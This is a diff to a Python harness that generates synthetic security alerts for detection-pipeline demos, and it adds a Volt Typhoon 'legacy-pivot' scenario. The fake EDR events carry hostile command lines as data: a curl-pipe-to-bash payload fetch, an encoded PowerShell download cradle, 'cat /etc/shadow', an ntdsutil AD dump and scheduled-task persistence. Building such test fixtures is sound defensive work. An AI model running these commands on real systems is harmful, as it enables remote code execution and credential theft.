@@ -29,6 +29,7 @@ Usage
     python scripts/aegis_harness.py scenario --name apt29-intrusion
     python scripts/aegis_harness.py scenario --name ransomware-response
     python scripts/aegis_harness.py scenario --name supply-chain
+    python scripts/aegis_harness.py scenario --name legacy-pivot
     python scripts/aegis_harness.py stress --count 200 --rate 50
     python scripts/aegis_harness.py smoke
     python scripts/aegis_harness.py status
@@ -89,6 +90,104 @@ def _future(days: int) -> str:
     return dt.isoformat()
 
 
+_PRIORITY_MATRIX: dict[str, str] = {
+    "cisa_kev":  "P0",
+    "edr":       "P0",
+    "siem":      "P1",
+    "threatfox": "P1",
+    "misp":      "P1",
+    "nvd":       "P2",
+    "stix":      "P3",
+}
+
+_ROUTING_MATRIX: dict[str, str] = {
+    "cisa_kev":  "triage",
+    "edr":       "detection",
+    "siem":      "triage",
+    "threatfox": "triage",
+    "misp":      "triage",
+    "nvd":       "advisory",
+    "stix":      "simulation",
+}
+
+
+# ── Synthetic Asset Inventory ────────────────────────────────────────────────
+# Centralised catalog of all synthetic assets used by demo, scenario, and
+# stress modes.  Each entry maps an asset_id to its attributes.
+
+ASSETS: dict[str, dict[str, str]] = {
+    "AS-001": {
+        "asset_id": "AS-001",
+        "hostname": "web-prod-01",
+        "ip":       "10.10.1.11",
+        "os":       "Ubuntu 22.04",
+        "role":     "Web / application server",
+        "zone":     "dmz",
+    },
+    "AS-004": {
+        "asset_id": "AS-004",
+        "hostname": "db-primary-01",
+        "ip":       "10.10.2.11",
+        "os":       "Ubuntu 22.04",
+        "role":     "Primary database server",
+        "zone":     "data",
+    },
+    "AS-007": {
+        "asset_id": "AS-007",
+        "hostname": "dc-primary",
+        "ip":       "10.10.3.10",
+        "os":       "Windows Server 2022",
+        "role":     "Domain controller",
+        "zone":     "core",
+    },
+    "AS-008": {
+        "asset_id": "AS-008",
+        "hostname": "file-server-01",
+        "ip":       "10.10.2.20",
+        "os":       "Windows Server 2022",
+        "role":     "File / share server",
+        "zone":     "data",
+    },
+    "AS-012": {
+        "asset_id": "AS-012",
+        "hostname": "ws-exec-001",
+        "ip":       "10.10.5.101",
+        "os":       "Windows 11",
+        "role":     "Executive workstation",
+        "zone":     "corporate",
+    },
+    "AS-015": {
+        "asset_id": "AS-015",
+        "hostname": "ci-runner-01",
+        "ip":       "10.10.6.10",
+        "os":       "Ubuntu 22.04",
+        "role":     "CI/CD build runner",
+        "zone":     "devops",
+    },
+    "AS-019": {
+        "asset_id": "AS-019",
+        "hostname": "ws-finance-003",
+        "ip":       "10.10.4.33",
+        "os":       "Windows 11",
+        "role":     "Finance workstation",
+        "zone":     "corporate",
+    },
+    "AS-VPN-01": {
+        "asset_id": "AS-VPN-01",
+        "hostname": "vpn-gw-01",
+        "ip":       "10.10.0.5",
+        "os":       "Linux",
+        "role":     "VPN gateway appliance",
+        "zone":     "perimeter",
+    },
+}
+
+
+def _asset(asset_id: str) -> dict[str, str]:
+    """Return asset attributes by ID — raises KeyError for unknown assets."""
+    return ASSETS[asset_id]
+
+
 def _event(
     source_type: str,
     raw_payload: dict[str, Any],
@@ -104,11 +203,9 @@ def _event(
         "raw_payload": json.dumps(raw_payload, separators=(",", ":")),
         "ingested_at": _now(),
         "ttl": str(ttl),
+        "priority": priority or _PRIORITY_MATRIX.get(source_type, "P3"),
+        "routing_target": routing_target or _ROUTING_MATRIX.get(source_type, "advisory"),
     }
-    if priority:
-        fields["priority"] = priority
-    if routing_target:
-        fields["routing_target"] = routing_target
     return fields
 
 
@@ -159,16 +256,17 @@ def _kev(cve_id: str, vendor: str, product: str, name: str, desc: str,
 
 
 def _edr(title: str, hostname: str, technique: str, severity: str,
-         process: dict, desc: str, asset_id: str = "AS-001",
-         ip: str = "10.10.5.101", os_name: str = "Windows 11",
+         process: dict, desc: str, asset_id: str | None = None,
+         ip: str | None = None, os_name: str | None = None,
          alert_type: str = "execution", **kw) -> dict[str, str]:
     """Shorthand for EDR alert event."""
+    _default = _asset("AS-012")
     return _event("edr", {
         "alert_id": f"EDR-{random.randint(100000, 999999)}",
         "hostname": hostname,
-        "asset_id": asset_id,
-        "ip": ip,
-        "os": os_name,
+        "asset_id": asset_id or _default["asset_id"],
+        "ip": ip or _default["ip"],
+        "os": os_name or _default["os"],
         "severity": severity,
         "alert_type": alert_type,
         "title": title,
@@ -191,7 +289,7 @@ def _siem(rule_name: str, technique: str, desc: str, severity: str = "high",
         "event_count": event_count,
         "time_window_minutes": random.choice([5, 10, 15, 30]),
         "source_ips": [f"10.10.{random.randint(1,10)}.{random.randint(1,254)}" for _ in range(random.randint(1, 5))],
-        "target": targets[0] if targets else {"hostname": "dc-primary", "ip": "10.10.3.10"},
+        "target": targets[0] if targets else {k: _asset("AS-007")[k] for k in ("hostname", "ip", "asset_id")},
         "mitre_technique": technique,
         "description": desc,
         "timestamp": _now(),
@@ -383,34 +481,38 @@ def build_demo_events() -> list[dict[str, str]]:
     ))
 
     # ── EDR Alerts (P0) ──────────────────────────────────────────────────
+    a = _asset("AS-012")
     events.append(_edr(
-        "LSASS Memory Access — Credential Dumping", "ws-exec-001", "T1003.001", "critical",
+        "LSASS Memory Access — Credential Dumping", a["hostname"], "T1003.001", "critical",
         {"name": "rundll32.exe", "pid": 4892, "ppid": 3104, "user": "CORP\\admin.jdoe",
          "cmdline": "rundll32.exe C:\\Windows\\Temp\\tmp4829.dll,DumpCreds"},
         "Suspicious process accessed LSASS memory using OpenProcess with PROCESS_VM_READ. "
         "Consistent with Mimikatz credential dumping.",
-        alert_type="credential_access", asset_id="AS-012",
+        alert_type="credential_access", asset_id=a["asset_id"], ip=a["ip"], os_name=a["os"],
     ))
+    a = _asset("AS-001")
     events.append(_edr(
-        "Reverse Shell Spawned by Web Server", "web-prod-01", "T1059.004", "critical",
+        "Reverse Shell Spawned by Web Server", a["hostname"], "T1059.004", "critical",
         {"name": "bash", "pid": 28412, "ppid": 1847, "user": "www-data",
          "cmdline": "/bin/bash -c 'curl http://45.77.65.211/payload.sh | bash'"},
         "nginx worker spawned /bin/bash with outbound connection to known C2 IP.",
-        os_name="Ubuntu 22.04", ip="10.10.1.11", asset_id="AS-001",
+        os_name=a["os"], ip=a["ip"], asset_id=a["asset_id"],
     ))
+    a = _asset("AS-019")
     events.append(_edr(
-        "Scheduled Task Persistence via schtasks", "ws-finance-003", "T1053.005", "high",
+        "Scheduled Task Persistence via schtasks", a["hostname"], "T1053.005", "high",
         {"name": "schtasks.exe", "pid": 7234, "ppid": 4100, "user": "CORP\\svc.backup",
          "cmdline": 'schtasks /create /tn "WindowsUpdate" /tr "powershell -ep bypass -f C:\\ProgramData\\update.ps1" /sc onlogon'},
         "Persistence mechanism created via scheduled task masquerading as Windows Update.",
-        alert_type="persistence", asset_id="AS-019", ip="10.10.4.33",
+        alert_type="persistence", asset_id=a["asset_id"], ip=a["ip"], os_name=a["os"],
     ))
+    a = _asset("AS-007")
     events.append(_edr(
-        "PowerShell Base64 Encoded Command Execution", "dc-primary", "T1059.001", "critical",
+        "PowerShell Base64 Encoded Command Execution", a["hostname"], "T1059.001", "critical",
         {"name": "powershell.exe", "pid": 9102, "ppid": 892, "user": "NT AUTHORITY\\SYSTEM",
          "cmdline": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkACcAKQA="},
         "Encoded PowerShell downloading payload from internal staging server. Likely post-exploitation.",
-        alert_type="execution", asset_id="AS-007", ip="10.10.3.10",
+        alert_type="execution", asset_id=a["asset_id"], ip=a["ip"], os_name=a["os"],
     ))
 
     # ── SIEM Correlation Alerts (P1) ──────────────────────────────────────
@@ -425,7 +527,7 @@ def build_demo_events() -> list[dict[str, str]]:
         "Host ws-exec-001 accessed ADMIN$ and C$ shares on 3 servers in 5 minutes "
         "using service account. Consistent with pass-the-hash lateral movement.",
         event_count=12,
-        targets=[{"hostname": "db-primary-01", "ip": "10.10.2.11", "asset_id": "AS-004"}],
+        targets=[{k: _asset("AS-004")[k] for k in ("hostname", "ip", "asset_id")}],
     ))
     events.append(_siem(
         "DNS Tunneling — Excessive TXT Queries", "T1071.004",
@@ -546,28 +648,32 @@ def _scenario_apt29_intrusion() -> list[tuple[float, dict[str, str]]]:
             ransomware="Known", event_id=f"{prefix}-02-kev",
         )),
         (5, _edr(
-            "Web Shell Detected on VPN Appliance", "vpn-gw-01", "T1505.003", "critical",
+            "Web Shell Detected on VPN Appliance", _asset("AS-VPN-01")["hostname"],
+            "T1505.003", "critical",
             {"name": "python3", "pid": 1247, "ppid": 1001, "user": "www-data",
              "cmdline": "python3 /tmp/.cache/webshell.py"},
             "Web shell process spawned under Ivanti web server context. Outbound C2 to "
             "185.220.101.34:8443. File hash matches known APT29 tooling.",
-            os_name="Linux", ip="10.10.0.5", asset_id="AS-VPN-01",
+            os_name=_asset("AS-VPN-01")["os"], ip=_asset("AS-VPN-01")["ip"],
+            asset_id="AS-VPN-01",
             event_id=f"{prefix}-03-webshell",
         )),
         (8, _siem(
             "Lateral Movement — RDP from VPN to Domain Controller", "T1021.001",
-            "VPN gateway vpn-gw-01 (10.10.0.5) initiated RDP session to dc-primary "
-            "(10.10.3.10). VPN appliances should not RDP to internal servers.",
+            f"VPN gateway {_asset('AS-VPN-01')['hostname']} ({_asset('AS-VPN-01')['ip']}) "
+            f"initiated RDP session to {_asset('AS-007')['hostname']} ({_asset('AS-007')['ip']}). "
+            "VPN appliances should not RDP to internal servers.",
             event_count=1, severity="critical",
             event_id=f"{prefix}-04-lateral",
         )),
         (12, _edr(
-            "DCSync Attack — Domain Replication Request", "dc-primary", "T1003.006", "critical",
+            "DCSync Attack — Domain Replication Request", _asset("AS-007")["hostname"],
+            "T1003.006", "critical",
             {"name": "lsass.exe", "pid": 764, "ppid": 4, "user": "NT AUTHORITY\\SYSTEM",
              "cmdline": "lsass.exe"},
             "Non-DC host ws-exec-001 issued DRS GetNCChanges replication request. "
             "Consistent with DCSync attack to dump all domain credentials.",
-            ip="10.10.3.10", asset_id="AS-007",
+            ip=_asset("AS-007")["ip"], asset_id="AS-007",
             alert_type="credential_access",
             event_id=f"{prefix}-05-dcsync",
         )),
@@ -579,12 +685,13 @@ def _scenario_apt29_intrusion() -> list[tuple[float, dict[str, str]]]:
             event_id=f"{prefix}-06-kerberoast",
         )),
         (18, _edr(
-            "Data Staging — Large Archive Created", "file-server-01", "T1074.001", "high",
+            "Data Staging — Large Archive Created", _asset("AS-008")["hostname"],
+            "T1074.001", "high",
             {"name": "7z.exe", "pid": 5521, "ppid": 4100, "user": "CORP\\svc.backup",
              "cmdline": "7z.exe a -p C:\\ProgramData\\backup.7z C:\\Shares\\Finance\\*"},
             "7z creating password-protected archive of Finance share. 2.3 GB staged "
             "to C:\\ProgramData. Unusual for service account at this time.",
-            ip="10.10.2.20", asset_id="AS-008",
+            ip=_asset("AS-008")["ip"], asset_id="AS-008",
             alert_type="collection",
             event_id=f"{prefix}-07-staging",
         )),
@@ -630,13 +737,13 @@ def _scenario_ransomware_response() -> list[tuple[float, dict[str, str]]]:
             event_id=f"{prefix}-03-kev",
         )),
         (7, _edr(
-            "PowerShell Download Cradle via Encoded Command", "ws-finance-003",
-            "T1059.001", "critical",
+            "PowerShell Download Cradle via Encoded Command",
+            _asset("AS-019")["hostname"], "T1059.001", "critical",
             {"name": "powershell.exe", "pid": 8821, "ppid": 1200, "user": "CORP\\admin.ops",
              "cmdline": "powershell -ep bypass -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQA..."},
             "Encoded PowerShell execution downloading second-stage from update-service-cdn.com. "
             "Parent is fortigate vpn process — likely post-exploitation of CVE-2024-21762.",
-            ip="10.10.4.33", asset_id="AS-019",
+            ip=_asset("AS-019")["ip"], asset_id="AS-019",
             event_id=f"{prefix}-04-pwsh",
         )),
         (12, _siem(
@@ -648,12 +755,13 @@ def _scenario_ransomware_response() -> list[tuple[float, dict[str, str]]]:
             event_id=f"{prefix}-05-encrypt",
         )),
         (14, _edr(
-            "Ransomware Note Dropped — LockBit 3.0", "file-server-01", "T1486", "critical",
+            "Ransomware Note Dropped — LockBit 3.0", _asset("AS-008")["hostname"],
+            "T1486", "critical",
             {"name": "lockbit.exe", "pid": 6612, "ppid": 8821, "user": "CORP\\admin.ops",
              "cmdline": "lockbit.exe --encrypt-all --note"},
             "LockBit 3.0 ransomware binary executing. Ransom notes dropped in every directory. "
             "Wallpaper changed. Volume shadow copies already deleted.",
-            ip="10.10.2.20", asset_id="AS-008",
+            ip=_asset("AS-008")["ip"], asset_id="AS-008",
             event_id=f"{prefix}-06-ransom",
         )),
         (16, _misp(
@@ -694,12 +802,13 @@ def _scenario_supply_chain() -> list[tuple[float, dict[str, str]]]:
             event_id=f"{prefix}-02-siem",
         )),
         (7, _edr(
-            "Reverse Shell from Node.js Process", "ci-runner-01", "T1059.007", "critical",
+            "Reverse Shell from Node.js Process", _asset("AS-015")["hostname"],
+            "T1059.007", "critical",
             {"name": "node", "pid": 15234, "ppid": 15100, "user": "ci-user",
              "cmdline": "node /home/ci-user/.npm/_postinstall/payload.js"},
             "Node.js process spawned by npm post-install hook established reverse shell "
             "to 185.29.8.47:443. Process accessing AWS credential files.",
-            os_name="Ubuntu 22.04", ip="10.10.6.10", asset_id="AS-015",
+            os_name=_asset("AS-015")["os"], ip=_asset("AS-015")["ip"], asset_id="AS-015",
             event_id=f"{prefix}-03-shell",
         )),
         (10, _siem(
@@ -725,10 +834,110 @@ def _scenario_supply_chain() -> list[tuple[float, dict[str, str]]]:
     ]
 
 
+def _scenario_legacy_pivot() -> list[tuple[float, dict[str, str]]]:
+    """
+    Volt Typhoon legacy infrastructure pivot — targets CMDB assets:
+
+    This scenario exploits the real CMDB topology:
+      1. MISP intel on Volt Typhoon targeting Cisco VPN appliances
+      2. CISA KEV for Cisco IOS XE CVE (matches VPN-01/02/03 running 17.9.3)
+      3. EDR: implant on VPN-01 (10.0.0.202)
+      4. SIEM: lateral movement from VPN-01 to legacy RHEL 6 server
+      5. EDR: credential harvesting on legacy RHEL 6 (EOL, no EDR agent)
+      6. SIEM: anomalous SMB access from legacy server to S3-FINANCIAL-REPORTS
+      7. EDR: living-off-the-land on DC01-PROD
+      8. ThreatFox: Volt Typhoon C2 beacon confirmed
+    """
+    prefix = "VOLTTYPH-DEMO"
+    return [
+        (0, _misp(
+            "Volt Typhoon targeting Cisco IOS XE VPN concentrators in critical infrastructure",
+            ["T1190", "T1078", "T1021.004", "T1562.001", "T1003.008"],
+            ["Volt Typhoon", "BRONZE SILHOUETTE"],
+            cve_ids=["CVE-2023-20198"],
+            tlp="tlp:red",
+            event_id=f"{prefix}-01-intel",
+        )),
+        (3, _kev(
+            "CVE-2023-20198", "Cisco", "IOS XE",
+            "Cisco IOS XE Web UI Privilege Escalation",
+            "Cisco IOS XE Software Web UI contains a privilege escalation vulnerability "
+            "that allows an unauthenticated attacker to create a local account with "
+            "privilege level 15 access. Actively exploited by Volt Typhoon.",
+            "Disable HTTP Server feature or restrict access to trusted networks. "
+            "Apply Cisco security patch.",
+            ransomware="Unknown", event_id=f"{prefix}-02-kev",
+        )),
+        (6, _edr(
+            "Implant Detected on VPN Concentrator — Cisco IOS XE",
+            "VPN-01", "T1505.003", "critical",
+            {"name": "nginx", "pid": 32109, "ppid": 1, "user": "root",
+             "cmdline": "/usr/sbin/nginx -c /tmp/.nginx.conf"},
+            "Rogue nginx process on VPN-01 (10.0.0.202) listening on port 8443. "
+            "Process was created after CVE-2023-20198 exploitation — implant "
+            "matches known Volt Typhoon BadCandy webshell. Config file in /tmp/.",
+            os_name="Cisco IOS XE", ip="10.0.0.202",
+            event_id=f"{prefix}-03-implant",
+        )),
+        (10, _siem(
+            "Lateral Movement — SSH from VPN Appliance to Legacy Server",
+            "T1021.004",
+            "VPN-01 (10.0.0.202) initiated SSH session to LEGACY-RHEL6-02 "
+            "(10.0.5.157, RHEL 6.10 EOL). VPN concentrators should never SSH "
+            "to legacy infrastructure. LEGACY-RHEL6-02 has no EDR agent and "
+            "runs end-of-life RHEL 6 with known unpatched vulnerabilities.",
+            event_count=1, severity="critical",
+            event_id=f"{prefix}-04-lateral",
+        )),
+        (14, _edr(
+            "Credential Harvesting via /etc/shadow on Legacy Host",
+            "LEGACY-RHEL6-02", "T1003.008", "critical",
+            {"name": "cat", "pid": 18774, "ppid": 18701, "user": "root",
+             "cmdline": "cat /etc/shadow"},
+            "Root-level access on LEGACY-RHEL6-02 (10.0.5.157, RHEL 6.10 EOL). "
+            "/etc/shadow read followed by base64 encoding and outbound transfer. "
+            "Host has no EDR — detected via network flow anomaly from SIEM collector.",
+            os_name="RHEL", ip="10.0.5.157",
+            alert_type="credential_access",
+            event_id=f"{prefix}-05-credharvest",
+        )),
+        (18, _siem(
+            "Anomalous S3 Access — Legacy Server to Financial Reports Bucket",
+            "T1530",
+            "LEGACY-RHEL6-02 (10.0.5.157) issued AWS S3 GetObject requests to "
+            "s3://aegis-financial-reports-prod/ using IAM role arn:aws:iam::123456789012:"
+            "role/legacy-backup-reader. 847 objects downloaded (12.3 GB) in 20 minutes. "
+            "This role has not been used in 90+ days. Bucket contains quarterly financials.",
+            event_count=847, severity="critical",
+            event_id=f"{prefix}-06-s3exfil",
+        )),
+        (22, _edr(
+            "Living-off-the-Land — ntdsutil on Domain Controller",
+            "DC01-PROD", "T1003.003", "critical",
+            {"name": "ntdsutil.exe", "pid": 9988, "ppid": 7712,
+             "user": "CORP\\svc-backup",
+             "cmdline": 'ntdsutil "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\ntds_dump" q q'},
+            "ntdsutil IFM (Install From Media) snapshot on DC01-PROD (10.0.1.38). "
+            "This creates a full copy of the AD database (ntds.dit + SYSTEM hive). "
+            "Service account svc-backup is legitimate but has not run ntdsutil before. "
+            "Consistent with Volt Typhoon credential dumping via living-off-the-land.",
+            os_name="Windows Server", ip="10.0.1.38",
+            alert_type="credential_access",
+            event_id=f"{prefix}-07-ntdsutil",
+        )),
+        (25, _threatfox(
+            "103.224.182.250:443", "ip:port", "VoltTyphoon",
+            tags=["volt-typhoon", "bronze-silhouette", "lotl", "chinese-nexus"],
+            event_id=f"{prefix}-08-c2",
+        )),
+    ]
+
+
 SCENARIOS: dict[str, callable] = {
-    "apt29-intrusion":    _scenario_apt29_intrusion,
+    "apt29-intrusion":     _scenario_apt29_intrusion,
     "ransomware-response": _scenario_ransomware_response,
-    "supply-chain":       _scenario_supply_chain,
+    "supply-chain":        _scenario_supply_chain,
+    "legacy-pivot":        _scenario_legacy_pivot,
 }
 
 
